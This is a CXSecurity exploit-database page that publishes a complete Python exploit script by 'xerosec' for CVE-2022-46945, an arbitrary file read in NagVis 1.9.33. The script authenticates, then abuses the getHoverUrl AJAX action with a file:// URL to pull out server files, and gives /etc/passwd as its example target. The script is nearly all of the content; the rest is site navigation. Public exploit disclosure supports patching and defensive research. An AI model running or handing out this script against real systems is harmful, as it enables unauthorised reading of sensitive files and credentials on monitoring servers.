---
title: NagVis 1.9.33 Arbitrary File Read
url: https://cxsecurity.com/issue/WLB-2025040026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-23
fetch_date: 2025-10-06T22:02:48.946428
---

# NagVis 1.9.33 Arbitrary File Read

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NagVis 1.9.33 Arbitrary File Read** **2025.04.22**  Credit:  **[xerosec](https://cxsecurity.com/author/xerosec/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-46945](https://cxsecurity.com/cveshow/CVE-2022-46945/ "Click to see CVE-2022-46945")**  CWE: **[CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")** | |

# Exploit Title: NagVis 1.9.33 - Arbitrary File Read
# Date: 03/12/2024
# Exploit Author: David Rodríguez a.k.a. xerosec
# Vendor Homepage: https://www.nagvis.org/
# Software Link: https://www.nagvis.org/downloads/archive
# Version: 1.9.33
# Tested on: Linux
# CVE: CVE-2022-46945
import requests
import argparse
import json
from urllib.parse import urljoin
def authenticate(target\_url, username, password):
url = urljoin(target\_url, '/nagvis/frontend/nagvis-js/index.php')
headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
data = {"\_username": username, "\_password": password, "submit": "Login"}
try:
response = requests.post(url, headers=headers, data=data)
if response.status\_code == 200 and "Set-Cookie" in response.headers:
print("[✔] Authentication successful.")
return response.headers["Set-Cookie"]
print(f"[✘] Authentication failed. Status code: {response.status\_code}")
except Exception as e:
print(f"[✘] Request error: {e}")
return None
def exploit(target\_url, session\_cookie, file\_path):
url = urljoin(target\_url, '/nagvis/server/core/ajax\_handler.php')
headers = {"User-Agent": "Mozilla/5.0", "Cookie": session\_cookie}
params = {"mod": "General", "act": "getHoverUrl", "url[]": f"file://{file\_path}"}
try:
response = requests.get(url, headers=headers, params=params)
if response.status\_code == 200:
print("[✔] Exploitation successful. File content:\n")
display\_file\_content(response.text)
else:
print(f"[✘] Exploitation failed. Status code: {response.status\_code}")
except Exception as e:
print(f"[✘] Request error: {e}")
def display\_file\_content(raw\_response):
try:
data = json.loads(raw\_response)
if isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict) and "code" in data[0]:
content = data[0]["code"]
# Decodificar escapes de manera segura
content = content.encode('utf-8').decode('unicode\_escape')
print(content.strip())
else:
print("[✘] Unexpected JSON structure.")
except json.JSONDecodeError as jde:
print(f"[✘] JSON decoding error: {jde}")
except Exception as e:
print(f"[✘] Unexpected error during output processing: {e}")
def main():
parser = argparse.ArgumentParser(description="Exploit for CVE-2022-46945 (File Read Vulnerability)")
parser.add\_argument("-t", "--target", required=True, help="Target base URL (e.g., http://10.0.2.132)")
parser.add\_argument("-u", "--username", required=True, help="Username for authentication")
parser.add\_argument("-p", "--password", required=True, help="Password for authentication")
parser.add\_argument("-f", "--file", required=True, help="File path to read (e.g., /etc/passwd)")
args = parser.parse\_args()
session\_cookie = authenticate(args.target, args.username, args.password)
if session\_cookie:
exploit(args.target, session\_cookie, args.file)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top